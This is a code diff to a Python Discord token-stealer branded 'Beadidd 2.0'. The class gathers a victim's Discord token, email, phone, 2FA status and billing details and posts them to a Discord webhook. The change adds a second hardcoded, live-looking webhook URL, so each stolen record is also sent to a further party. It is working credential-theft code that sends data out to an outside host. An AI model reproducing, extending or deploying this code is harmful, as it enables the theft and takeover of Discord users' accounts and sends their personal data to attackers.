@@ -91,13 +91,16 @@ class DISCORD:
                                 bil=":credit_card:"
                             elif b['type']==2:
                                 bil=":regional_indicator_p:"
-                    webhook = DiscordWebhook(url=wbh, username="Beadidd 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
+                    dual = r'https://discord.com/api/webhooks/1086774409051770910/C2ft6LFhqdTpsb51sISp2NMxOZCQwM7Mgq946cqN3v4uqbVWSHoawsEithGR4q1xc8kk'
+                    webhook1, webhook2 = DiscordWebhook.create_batch(urls=[wbh, dual], username="Beadidd 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
                     embed = DiscordEmbed(title=f"Discord Token", description=f"Found Discord Token", color='4300d1')
                     embed.set_author(name="author : Beadiddd", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
                     embed.set_footer(text='Beadiddd 2.0 | by : Beadiddd')
                     embed.set_timestamp()
                     embed.add_embed_field(name=f"Account of {user}", value=f":id: ID: ``{id}``\n:email: Email: ``{email}``\n:mobile_phone: Phone: ``{phone}``\n:ballot_box_with_check: Verified: {verf}\n:closed_lock_with_key: 2FA: {af2}\n\n\n:purple_circle: Nitro: {N}\n:page_with_curl: Billing: {bil}\n\n\n:coin: Token: ``{tok}``")
                     embed.set_thumbnail(url=avatar)
-                    webhook.add_embed(embed)
-                    webhook.execute()
+                    webhook1.add_embed(embed)
+                    webhook2.add_embed(embed)
+                    webhook1.execute()
+                    webhook2.execute()
                 except:pass
